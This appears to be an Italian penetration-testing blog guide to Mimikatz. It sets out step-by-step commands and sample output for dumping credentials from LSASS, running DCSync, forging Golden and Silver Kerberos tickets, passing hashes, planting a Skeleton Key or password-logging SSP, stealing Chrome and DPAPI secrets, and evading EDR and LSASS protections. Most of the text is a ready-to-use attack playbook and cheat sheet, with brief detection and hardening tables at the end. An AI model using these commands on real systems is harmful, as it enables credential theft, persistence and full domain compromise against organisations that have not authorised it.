---
title: 'Mimikatz: Guida Completa Credential Dumping e Active Directory Attack'
slug: mimikatz
description: 'Mimikatz spiegato per pentest: estrazione credenziali LSASS, DCSync, Golden Ticket, pass-the-hash e attacchi Active Directory con esempi pratici.'
image: '/ChatGPT%20Image%20Feb%2022,%202026,%2004_09_03%20PM.webp'
draft: true
date: 2026-02-28T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - privesc-windows
  - ad
featured: true
---

Mimikatz è lo strumento più potente per il **credential dumping su Windows** e il dominio di **Active Directory**. Utilizzato in pentest e Red Team, permette di estrarre password in chiaro, hash NTLM e ticket Kerberos direttamente dalla memoria LSASS.

Con Mimikatz puoi eseguire attacchi come **[Pass-the-Hash](https://hackita.it/articoli/pass-the-hash)**, **[DCSync](https://hackita.it/articoli/dcsync)** e **[Golden Ticket](https://hackita.it/articoli/golden-ticket)**, ottenendo accesso completo al dominio senza conoscere le password reali.

In questa guida vedrai i **comandi Mimikatz più importanti**, come usarli in scenari reali e come trasformare un accesso locale in compromissione totale dell’infrastruttura.

**TL;DR**

* Dump credenziali → `sekurlsa::logonpasswords`
* Dump Active Directory → `lsadump::dcsync`
* Persistenza → `kerberos::golden`

## Perché Mimikatz è Ancora Rilevante nel 2026

Dopo 15 anni, Mimikatz resta fondamentale per tre ragioni:

1. **LSASS contiene ancora credenziali**: Windows caches credenziali in memoria per SSO. Finché questo design esiste, Mimikatz funziona
2. **Active Directory dipende da NTLM e Kerberos**: entrambi i protocolli sono sfruttabili con gli hash e le chiavi che Mimikatz estrae
3. **Nessun sostituto completo**: altri tool (SharpKatz, Rubeus, nanodump) coprono parti di Mimikatz, ma nessuno ha la completezza dell'originale

Il rilevamento è migliorato enormemente (EDR, Credential Guard, PPL), ma le tecniche di evasione si sono evolute di pari passo. Mimikatz è il fondamento — anche quando usi alternative, devi capire cosa fa Mimikatz per capire cosa fanno loro.

## 1. Prerequisiti e Avvio

### Cosa serve

```

* Accesso a un sistema Windows (shell, RDP, WinRM)
* Privilegi di amministratore locale (per la maggior parte dei moduli)
* Privilege SeDebugPrivilege (per accedere alla memoria LSASS)
* Mimikatz binary o variante (vedi sezione Evasion)

```

### Avvio

`````

mimikatz.exe

````md
.#####.   mimikatz 2.2.0 (x64) #19041  
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)  

## / \ ##  /*** Benjamin DELPY `gentilkiwi`  
## \ / ##       > https://blog.gentilkiwi.com/mimikatz  

'## v ##'  
'#####'  

mimikatz #

### Privilegi necessari

```bash
mimikatz # privilege::debug
`````

```
Privilege '20' OK
```

Se ottieni `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061` → non sei Administrator o Credential Guard è attivo.

### Eleva a SYSTEM

```bash
mimikatz # token::elevate
```

```
Token Id  : 0
User name : NT AUTHORITY\SYSTEM

```

## 2. sekurlsa — Extraction Credenziali dalla Memoria

Il modulo più usato. Legge il processo LSASS (Local Security Authority Subsystem Service) che contiene le credenziali di tutti gli utenti che hanno effettuato il login.

### sekurlsa::logonpasswords — Il Comando d'Oro

```

mimikatz # sekurlsa::logonpasswords

```

**Output:**

```

Authentication Id : 0 ; 12345678 (00000000:00bc614e)
Session           : Interactive from 1
User Name         : j.smith
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/15/2026 10:00:00 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1103

```

```
msv :
 [00000003] Primary
 * Username : j.smith
 * Domain   : CORP
 * NTLM     : 64f12cddaa88057e06a81b54e73b949b
 * SHA1     : a4f49c406510bdcab6824ee7c30fd852d123456

tspkg :
 * Username : j.smith
 * Domain   : CORP
 * Password : Summer2026!

wdigest :
 * Username : j.smith
 * Domain   : CORP
 * Password : Summer2026!

kerberos :
 * Username : j.smith
 * Domain   : CORP.LOCAL
 * Password : Summer2026!

credman :
 [00000000]
 * Username : admin@10.10.10.50
 * Password : AdminP@ss!
```

```

Authentication Id : 0 ; 23456789
Session           : Service from 0
User Name         : svc\_sql
Domain            : CORP
msv :
\* Username : svc\_sql
\* Domain   : CORP
\* NTLM     : a87f3a337d73085c45f9416be5787d86

```

```
kerberos :
 * Username : svc_sql
 * Domain   : CORP.LOCAL
 * Password : SqlS3rvice2025!
```

```
```

**Lettura dell'output — cosa hai ottenuto:**

**j.smith:**

* **Hash NTLM**: `64f12cddaa88057e06a81b54e73b949b` → [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) verso qualsiasi servizio
* **Password in chiaro**: `Summer2026!` (da tspkg/wdigest/kerberos) → login diretto ovunque
* **Credential Manager**: `admin@10.10.10.50 / AdminP@ss!` → credenziali salvate per un altro server

**svc\_sql:**

* **Hash NTLM**: `a87f3a337d73085c45f9416be5787d86` → PtH verso SQL server
* **Password**: `SqlS3rvice2025!` → login diretto su [MSSQL](https://hackita.it/articoli/porta-1433-mssql)

**Nota sulle password in chiaro:**

* **WDigest**: disabilitato di default da Windows 8.1+ / Server 2012 R2+ (`UseLogonCredential` reg key). Su sistemi vecchi o con la chiave abilitata → password in chiaro
* **CredMan**: credenziali salvate dall'utente (RDP, share, browser) — spesso le più preziose

### sekurlsa::msv — Solo hash MSV

```

mimikatz # sekurlsa::msv

```

Più veloce di `logonpasswords` — solo hash NTLM.

### sekurlsa::ekeys — Chiavi di encryption Kerberos

```

mimikatz # sekurlsa::ekeys

```

```

* Username : j.smith
  * aes256\_hmac: b7268f45a1b2c3d4e5f6789...
  * aes128\_hmac: 9a3e21cd1234abcd...
  * rc4\_hmac\_nt: 64f12cddaa88057e06a81b54e73b949b

```

Le chiavi AES servono per Golden/Silver Ticket stealth (evita detection "encryption downgrade").

### sekurlsa::tickets — Ticket Kerberos in memoria

```

mimikatz # sekurlsa::tickets /export

```

```

\[00000000] - 0x00000012 - aes256\_hmac
Server Name : krbtgt/CORP.LOCAL @ CORP.LOCAL
Client Name : j.smith @ CORP.LOCAL
-> Ticket saved to: \[0;12345][-2-0-40e10000-j.smith@krbtgt-CORP.LOCAL.kirbi](mailto:-2-0-40e10000-j.smith@krbtgt-CORP.LOCAL.kirbi)

```

TGT esportato come `.kirbi` → iniettabile su un'altra macchina con `kerberos::ptt`.

### sekurlsa::pth — Pass-the-Hash

```

mimikatz # sekurlsa::pth /user:j.smith /domain:corp.local /ntlm:64f12cddaa88057e06a81b54e73b949b

```

```

program : cmd.exe
NTLM    : 64f12cddaa88057e06a81b54e73b949b
\|  PID  1234
\_ cmd.exe (1234)

```

Apre `cmd.exe` che opera come j.smith via hash. Qualsiasi connessione SMB/LDAP/HTTP Negotiate usa l'hash.

**Da Linux (Impacket):**

```bash
psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b corp.local/j.smith@10.10.10.50
```

```bash
evil-winrm -i 10.10.10.50 -u j.smith -H 64f12cddaa88057e06a81b54e73b949b
```

```bash
crackmapexec smb 10.10.10.0/24 -u j.smith -H 64f12cddaa88057e06a81b54e73b949b
```

## 3. lsadump — Database Locale e Dominio

### lsadump::sam — Hash SAM locali

```
mimikatz # lsadump::sam
```

```
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4

RID  : 000003e9 (1001)
User : localadmin
  Hash NTLM: 7facdc498ed1680c4fd1448319a8c04f
```

Hash locali — l'Administrator locale è spesso lo stesso su più macchine (image cloning). Spray:

```bash
crackmapexec smb 10.10.10.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba -d . --local-auth
```

### lsadump::secrets — LSA Secrets

```
mimikatz # lsadump::secrets
```

```
Secret  : _SC_MSSQLSERVER
cur/text: SqlS3rvice2025!

Secret  : DefaultPassword
cur/text: AutoLogonP@ss!

Secret  : $MACHINE.ACC
cur/NTLM: ab12cd34ef56789...
```

* **`_SC_` prefix**: password dei servizi Windows (SQL, IIS, Exchange)
* **DefaultPassword**: credenziali auto-logon
* **$MACHINE.ACC**: hash dell'account computer

### lsadump::cache — Cached Domain Credentials

```
mimikatz # lsadump::cache
```

```
[NL$1 - 1/15/2026]
User      : CORP\admin
MsCacheV2 : $DCC2$10240#admin#hash...
```

Crackabili con [hashcat](https://hackita.it/articoli/hashcat) mode 2100 — molto più lente di NTLM.

### lsadump::dcsync — Il Comando più Potente

Replica il database AD dal DC. Per la guida completa: [DCSync](https://hackita.it/articoli/dcsync).

```
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

```
SAM Username : Administrator
Hash NTLM    : 32ed87bdb5fdc5e9cba88547376818d4
aes256_hmac  : b7268f45a1b2c3d4e5f6789...
```

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

L'hash di `krbtgt` è la chiave per il Golden Ticket.

```
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

Tutti gli hash del dominio in una riga.

**Da Linux (Impacket — equivalente):**

```bash
secretsdump.py corp.local/Administrator:'P@ssw0rd'@DC01 -just-dc
```

### lsadump::trust — Chiavi di trust

```
mimikatz # lsadump::trust /patch
```

```
Domain: PARTNER.LOCAL
 [ Out ] CORP.LOCAL -> PARTNER.LOCAL
    * rc4_hmac_nt: trust_key_ntlm...
```

Chiavi per attacchi cross-forest.

## 4. kerberos — Ticket Forging

### kerberos::golden — Golden Ticket

```
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /ptt
```

```
Golden ticket for 'fakeadmin @ corp.local' successfully submitted for current session
```

Parametri:

* `/user:fakeadmin` — qualsiasi nome, anche inesistente
* `/sid:S-1-5-21-...` — SID del dominio
* `/krbtgt:hash` — hash NTLM di krbtgt (dal DCSync)
* `/ptt` — inietta in memoria

**Con AES256 (evita detection downgrade):**

```
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /aes256:a1b2c3d4e5f6789... /ptt
```

Dopo il Golden Ticket:

```
dir \\DC01\c$
psexec \\DC01 cmd
```

**Da Linux:**

```bash
ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-... -domain corp.local fakeadmin
export KRB5CCNAME=fakeadmin.ccache
psexec.py -k -no-pass corp.local/fakeadmin@DC01.corp.local
```

**Durata:** valido finché `krbtgt` non cambia **due volte**. Spesso = anni.

### kerberos::silver — Silver Ticket

TGS forgiato per un singolo servizio — invisibile al DC.

```
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
```

Accesso a [MSSQL](https://hackita.it/articoli/porta-1433-mssql) su sql01 senza contattare il DC.

### kerberos::ptt — Pass-the-Ticket

```
mimikatz # kerberos::ptt ticket.kirbi
```

### kerberos::list e purge

```
mimikatz # kerberos::list
```

```
mimikatz # kerberos::purge
```

## 5. dpapi — Credenziali Salvate

### Chrome passwords

```
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

```
URL      : https://corp.local/login
Username : admin@corp.local
Password : CorpAdmin2026!
```

### Credential Manager

```
mimikatz # vault::cred
```

```
TargetName : Domain:target=RDP/10.10.10.50
User       : admin
Password   : RDP_Admin_P@ss!
```

### Domain DPAPI Backup Key (se DA)

```
mimikatz # lsadump::backupkeys /system:DC01.corp.local /export
```

Con questa chiave decripti le credenziali DPAPI di TUTTI gli utenti del dominio — offline.

## 6. misc — Persistence e Utility

### misc::skeleton — Skeleton Key

```
mimikatz # misc::skeleton
```

```
[KDC] service patched
```

Dopo: qualsiasi utente del dominio accetta la password `mimikatz` oltre alla password reale. Solo in memoria — scompare al riavvio.

### misc::memssp — Password Logger

```
mimikatz # misc::memssp
```

Ogni login successivo viene loggato con password in chiaro in `C:\Windows\System32\mimilsa.log`.

## 7. token — Impersonation

```
mimikatz # token::elevate
```

Impersona SYSTEM.

```
mimikatz # token::elevate /domainadmin
```

Cerca e impersona un token DA se presente in memoria.

## 8. Evasion — Bypassare le Detection

### Alternative a Mimikatz

| Tool               | Funzione                             | Vantaggio                     |
| ------------------ | ------------------------------------ | ----------------------------- |
| **SharpKatz**      | Port .NET di Mimikatz                | Meno signature                |
| **SafetyKatz**     | Mimikatz offuscato .NET              | Evasion migliorata            |
| **nanodump**       | Dump LSASS minimalista               | Molto piccolo, poca detection |
| **Rubeus**         | Solo Kerberos (ask, renew, ptt, s4u) | Specializzato, meno detection |
| **secretsdump.py** | DCSync da Linux                      | Non tocca il target Windows   |
| **pypykatz**       | Mimikatz in Python                   | Analisi offline di dump LSASS |
| **lsassy**         | Dump LSASS remoto via SMB            | Da Linux, una riga            |

### Dump LSASS senza Mimikatz

**Task Manager (GUI):**

```
Task Manager → Details → lsass.exe → Create dump file
```

Trasferisci il dump e analizza:

```bash
pypykatz lsa minidump lsass.DMP
```

**comsvcs.dll (LoLBin — nessun tool esterno):**

```
# Trova PID di LSASS
tasklist /fi "imagename eq lsass.exe"
```

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\temp\lsass.dmp full
```

**ProcDump (tool Microsoft legittimo):**

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**nanodump:**

```
nanodump.exe --write C:\temp\lsass.dmp
```

**lsassy (da Linux via SMB — tutto in un comando):**

```bash
lsassy -u admin -H HASH 10.10.10.40
```

```
CORP\j.smith  64f12cddaa88057e06a81b54e73b949b  Summer2026!
CORP\svc_sql  a87f3a337d73085c45f9416be5787d86  SqlS3rvice2025!
```

### Credential Guard bypass

Credential Guard isola LSASS in Virtual Secure Mode. Mimikatz non legge la memoria protetta. Ma:

```
NON protetto da Credential Guard:
- Kerberos ticket in cache
- DPAPI keys
- Cached credentials (DCC2)
- Credential Manager
- DCSync (non dipende da LSASS)
```

### PPL (Protected Process Light) bypass

```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

Richiede il driver `mimidrv.sys` firmato.

## 9. Scenari Completi

### Workstation → DA → Dominio

```
Shell su workstation (exploit/phishing)
→ privilege::debug
→ sekurlsa::logonpasswords → hash j.smith
→ crackmapexec smb rete -u j.smith -H HASH → trova server con admin
→ psexec sul server → Mimikatz → hash Domain Admin
→ lsadump::dcsync /user:krbtgt → Golden Ticket
→ Dominio completo
```

### LSASS dump offline (stealth)

```
comsvcs.dll dump su target → trasferisci .dmp
→ pypykatz lsa minidump lsass.dmp → hash + password
→ Nessun Mimikatz.exe toccato sul target → meno detection
```

### DCSync completo da Linux

```
secretsdump.py corp/DA:pass@DC01 -just-dc
→ Tutti gli hash → ticketer.py Golden Ticket
→ psexec.py -k -no-pass → shell su qualsiasi macchina
```

Per il workflow DCSync dettagliato: [guida DCSync](https://hackita.it/articoli/dcsync).

## 10. Detection

| Indicatore    | Event ID        | Descrizione                                |
| ------------- | --------------- | ------------------------------------------ |
| LSASS access  | **Sysmon 10**   | Process access a LSASS                     |
| DCSync        | **4662**        | DS replication da non-DC (GUID di replica) |
| Golden Ticket | **4769**        | TGS con encryption downgrade (RC4)         |
| Skeleton Key  | **System**      | Modifica servizio KDC                      |
| PtH           | **4624** Type 9 | NewCredentials logon                       |

## 11. Cheat Sheet Finale

### Credential Extraction

| Azione           | Comando                               |
| ---------------- | ------------------------------------- |
| Debug privilege  | `privilege::debug`                    |
| Elevate SYSTEM   | `token::elevate`                      |
| Password + hash  | `sekurlsa::logonpasswords`            |
| Solo hash MSV    | `sekurlsa::msv`                       |
| Chiavi Kerberos  | `sekurlsa::ekeys`                     |
| SAM locale       | `lsadump::sam`                        |
| LSA Secrets      | `lsadump::secrets`                    |
| Cached creds     | `lsadump::cache`                      |
| Chrome passwords | `dpapi::chrome /in:[path] /unprotect` |
| Credential Vault | `vault::cred`                         |

### Active Directory

| Azione        | Comando                                                  |
| ------------- | -------------------------------------------------------- |
| DCSync utente | `lsadump::dcsync /domain:corp.local /user:Administrator` |
| DCSync krbtgt | `lsadump::dcsync /domain:corp.local /user:krbtgt`        |
| DCSync all    | `lsadump::dcsync /domain:corp.local /all /csv`           |
| Trust keys    | `lsadump::trust /patch`                                  |
| DPAPI backup  | `lsadump::backupkeys /system:DC01 /export`               |

### Kerberos

| Azione          | Comando                                                                                     |
| --------------- | ------------------------------------------------------------------------------------------- |
| Golden Ticket   | `kerberos::golden /user:fake /domain:corp /sid:SID /krbtgt:HASH /ptt`                       |
| Golden AES      | `kerberos::golden /user:fake /domain:corp /sid:SID /aes256:KEY /ptt`                        |
| Silver Ticket   | `kerberos::golden /user:fake /domain:corp /sid:SID /target:SRV /service:SPN /rc4:HASH /ptt` |
| Pass-the-Ticket | `kerberos::ptt ticket.kirbi`                                                                |
| Export tickets  | `sekurlsa::tickets /export`                                                                 |
| Purge           | `kerberos::purge`                                                                           |

### Pass-the-Hash

| Tool       | Comando                                             |
| ---------- | --------------------------------------------------- |
| Mimikatz   | `sekurlsa::pth /user:admin /domain:corp /ntlm:HASH` |
| psexec.py  | `psexec.py -hashes :HASH corp/admin@target`         |
| wmiexec.py | `wmiexec.py -hashes :HASH corp/admin@target`        |
| evil-winrm | `evil-winrm -i target -u admin -H HASH`             |
| CME        | `cme smb target -u admin -H HASH`                   |

### Persistence

| Tecnica       | Comando                     |
| ------------- | --------------------------- |
| Skeleton Key  | `misc::skeleton`            |
| SSP Logger    | `misc::memssp`              |
| Golden Ticket | `kerberos::golden ... /ptt` |

### Evasion

| Metodo           | Tool                                  |
| ---------------- | ------------------------------------- |
| Dump LSASS (Win) | `comsvcs.dll`, `procdump`, `nanodump` |
| Analisi offline  | `pypykatz lsa minidump lsass.dmp`     |
| Dump remoto      | `lsassy -u admin -H HASH target`      |
| DCSync Linux     | `secretsdump.py corp/admin:pass@DC`   |
| Kerberos Win     | `Rubeus.exe`                          |
| Kerberos Linux   | `ticketer.py`, `GetUserSPNs.py`       |

### Hardening

* **Credential Guard** abilitato (protegge LSASS in VSM)
* **LSASS PPL** abilitato (Protected Process Light)
* **WDigest disabilitato** (default da Win 8.1+ ma verifica)
* **Protected Users group** per admin (no caching, no NTLM, no delegation)
* **Ruota krbtgt** periodicamente (due volte per invalidare Golden Ticket)
* **Tier model**: DA usato solo su DC, mai su workstation
* **LAPS/gMSA** per account locali e di servizio
* **Monitoraggio**: Sysmon Event 10 su LSASS, Event 4662 per DCSync

***

Riferimento:

* Mimikatz (gentilkiwi) → [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
* SpecterOps → [https://specterops.io/](https://specterops.io/)
* harmj0y → [https://blog.harmj0y.net/](https://blog.harmj0y.net/)

Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
